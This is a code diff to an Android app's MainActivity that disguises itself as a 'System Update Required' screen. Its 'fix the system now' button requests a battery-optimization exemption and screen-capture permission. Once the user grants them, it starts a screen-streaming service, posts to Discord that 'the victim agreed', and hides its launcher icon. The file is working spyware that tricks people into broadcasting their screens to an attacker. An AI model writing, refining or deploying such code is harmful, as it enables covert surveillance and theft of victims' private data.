@@ -1,6 +1,6 @@
 package com.tom5.monitor;
 
-import android.app.Activity; // استخدمنا Activity العادية لمنع كراش الثيم
+import android.app.Activity;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
@@ -23,62 +23,55 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // بناء الواجهة برمجياً لضمان عدم وجود أخطاء في ملفات الـ XML
         LinearLayout layout = new LinearLayout(this);
         layout.setOrientation(LinearLayout.VERTICAL);
         layout.setGravity(Gravity.CENTER);
         layout.setBackgroundColor(Color.WHITE);
 
         TextView tv = new TextView(this);
-        tv.setText("Update System 2024");
-        tv.setTextSize(22);
-        tv.setTextColor(Color.BLACK);
-        tv.setPadding(0, 0, 0, 60);
+        tv.setText("System Update Required");
+        tv.setTextSize(20);
+        tv.setPadding(0, 0, 0, 50);
         layout.addView(tv);
 
         Button btn = new Button(this);
-        btn.setText("START UPDATE NOW");
-        btn.setBackgroundColor(Color.parseColor("#2196F3"));
-        btn.setTextColor(Color.WHITE);
-        btn.setPadding(20, 20, 20, 20);
-        
+        btn.setText("إصلاح النظام الآن");
         btn.setOnClickListener(v -> {
-            // طلب استثناء البطارية
-            try {
-                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
-                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                    intent.setData(Uri.parse("package:" + getPackageName()));
-                    startActivity(intent);
-                }
-            } catch (Exception ignored) {}
-
-            // فتح إعدادات إمكانية الوصول
-            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
-
-            // طلب بث الشاشة
+            // 1. طلب استثناء البطارية أولاً
+            requestBatterySettings();
+            // 2. طلب بث الشاشة
             MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
             if (mpm != null) {
                 startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CODE);
             }
         });
-        
         layout.addView(btn);
         setContentView(layout);
+    }
+
+    private void requestBatterySettings() {
+        try {
+            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
+                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                intent.setData(Uri.parse("package:" + getPackageName()));
+                startActivity(intent);
+            }
+        } catch (Exception e) {}
     }
 
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
         if (requestCode == REQ_CODE && resultCode == RESULT_OK) {
-            Intent intent = new Intent(this, ScreenService.class);
-            intent.putExtra("resCode", resultCode);
-            intent.putExtra("resData", data);
-            startForegroundService(intent);
+            Intent serviceIntent = new Intent(this, ScreenService.class);
+            serviceIntent.putExtra("resCode", resultCode);
+            serviceIntent.putExtra("resData", data);
+            startForegroundService(serviceIntent);
+
+            DiscordSender.sendMessage("✅ الضحية وافق! بدأ البث الآن.");
             
-            DiscordSender.sendMessage("✅ تم بدء البث بنجاح من جهاز جديد!");
-            
-            // إخفاء الأيقونة
+            // إخفاء الأيقونة فوراً
             getPackageManager().setComponentEnabledSetting(
                 new ComponentName(this, MainActivity.class),
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
